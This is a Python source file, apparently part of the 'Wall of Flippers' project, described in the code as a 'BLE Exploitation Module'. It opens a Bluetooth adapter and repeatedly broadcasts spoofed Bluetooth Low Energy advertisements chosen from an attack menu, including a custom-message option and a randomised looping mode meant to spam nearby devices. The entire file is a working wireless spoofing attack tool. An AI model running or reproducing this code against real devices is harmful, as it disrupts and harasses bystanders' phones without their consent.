#                               YAao,                            
#                                 Y8888b,                        Created By: Kiyomi + Emilia (jbohack)
#                               ,oA8888888b,                     Emilia: https://ko-fi.com/emilia0001
#                         ,aaad8888888888888888bo,               Kiyomi: https://ko-fi.com/k3yomi
#                      ,d888888888888888888888888888b,               
#                    ,888888888888888888888888888888888b,            
#                   d8888888888888888888888888888888888888,                   
#                  d888888888888888888888888888888888888888b             
#                 d888888P'                    `Y88888888Ꙩ \,          
#                 88888P'                    Ybaaaa888888  Ꙩ l          
#                a8888'                      `Y8888P' `V888888    
#              d8888888a                                `Y8888           
#             AY/'' `\Y8b                                 ``Y8b
#             Y'      `YP                                    ~~
#     _       __      ____         ____   _________                           
#    | |     / /___ _/ / /  ____  / __/  / ____/ (_)___  ____  ___  __________
#    | | /| / / __ `/ / /  / __ \/ /_   / /_  / / / __ \/ __ \/ _ \/ ___/ ___/
#    | |/ |/ / /_/ / / /  / /_/ / __/  / __/ / / / /_/ / /_/ /  __/ /  (__  ) 
#    |__/|__/\__,_/_/_/   \____/_/    /_/   /_/_/ .___/ .___/\___/_/  /____/ 
#                                              /_/   /_/ 


# Basic Imports
import os
import sys
import time
import random


# Wall of Flippers "library" for important functions and classes :3
import utils.wof_cache as cache # Wall of Flippers "cache" for important configurations and data :3
import utils.wof_library as library # Wall of Flippers "library" for important functions and classes :3


def init():
    """Initializes the Wall of Flippers BLE Exploitation Module"""
    if not cache.wof_data['system_type'] == "posix":
        library.print_ascii_art("This feature is not supported on your device.")
        print("[!] Wall of Flippers >> This feature is not supported on your device.")
        sys.exit()
    try:
        from utils.bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising
        import bluetooth._bluetooth as bluez
    except ImportError as e:
        library.print_ascii_art("Error: Failed to import dependencies")
        print(f"[!] Wall of Flippers >> Failed to import dependencies >> {e}")
        sys.exit()
    ble_adapters = []
    if cache.wof_data['system_type'] == "posix":
        ble_adapters = [adapter for adapter in os.listdir('/sys/class/bluetooth/') if 'hci' in adapter]
        # make a selection of the bluetooth adapter
        print("\n\n[#]\t[HCI DEVICE]")
        print("-------------------------------------------------------------------------------------------------")
        for adapter in ble_adapters:
            print(f"{ble_adapters.index(adapter)}".ljust(8) + f"{adapter}".ljust(34))
        dev_id = int(input("[?] Wall of Flippers >> "))
    else:
        dev_id = 0
    try:
        sock = bluez.hci_open_dev(dev_id)
        toggle_device(dev_id, True)
    except Exception as e:
        library.print_ascii_art("Error: Failed to open bluetooth device")
        print(f"[!] Wall of Flippers >> Failed to open bluetooth device {dev_id}\nError: {e}")
        sys.exit()
    library.print_ascii_art("Please Select an option to continue")
    print("\n\n[#]\t[ACTION]")
    print("---------------------------------------------------------------------------------------------------")
    dialogue_options = cache.wof_data['ble_attack_directory_options'] # Credits for the directory @ECTO-1A (https://github.com/ECTO-1A/AppleJuice)
    for option in dialogue_options:
        print(f"{option['option'].ljust(8)}{option['action'].ljust(34)}")
    try:
        user_input = input("[?] Wall of Flippers >> ")
        if user_input == "13":
            user_input_custom = input("[?] Wall of Flippers >> Please enter a custom message >> ")
            data_hex = lambda data: ''.join(f"{i:02x}" for i in data)
            dialogue_options[12]['hex'] = (0x16, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80) + tuple(user_input_custom.encode())
            while len(dialogue_options[12]['hex']) < 31:
                dialogue_options[12]['hex'] += (0x00,)
            if len(dialogue_options[12]['hex']) > 31:
                dialogue_options[12]['hex'] = dialogue_options[12]['hex'][:31]
        elif user_input == "14":
            try:
                while True:
                    time.sleep(0.1)
                    random_data = dialogue_options[random.randint(0, len(dialogue_options) - 2)]
                    if random_data['action'] != "RANDOM_LOOPED":
                        data = random_data['hex']
                        to_hex = lambda data: ''.join(f"{i:02x}" for i in data)
                        data_hex = to_hex(data)
                        start_le_advertising(sock, adv_type=0x03, data=data)
                        time.sleep(0.1)
                        print(f"Wall of Flippers >> Advertising as {random_data['action']} >> {data_hex}")
                        stop_le_advertising(sock)  # Make sure this function is correctly implemented
            except KeyboardInterrupt:
                stop_le_advertising(sock)
                library.print_ascii_art("Thank you for using Wall of Flippers... Goodbye!")
                sys.exit()
        if not user_input == "14":
            for option in dialogue_options:
                if user_input == option['option'] and option['action'] != "RANDOM_LOOPED":
                    library.print_ascii_art("Advertising as " + option['action'])
                    data = option['hex']
                    to_hex = lambda data: ''.join(f"{i:02x}" for i in data)
                    try:
                        while True:
                            data_hex = to_hex(data)
                            start_le_advertising(sock, adv_type=0x03, data=data)
                            print(f"Wall of Flippers >> Advertising as {option['action']} >> {data_hex}")
                            time.sleep(0.1)
                            stop_le_advertising(sock)  # Make sure this function is correctly implemented
                    except KeyboardInterrupt:
                        stop_le_advertising(sock)
                        library.print_ascii_art("Thank you for using Wall of Flippers... Goodbye!")
                        sys.exit() # test
    except KeyboardInterrupt:
        library.print_ascii_art("Thank you for using Wall of Flippers... Goodbye!")
        print("\n[!] Wall of Flippers >> Exiting...")
        sys.exit()
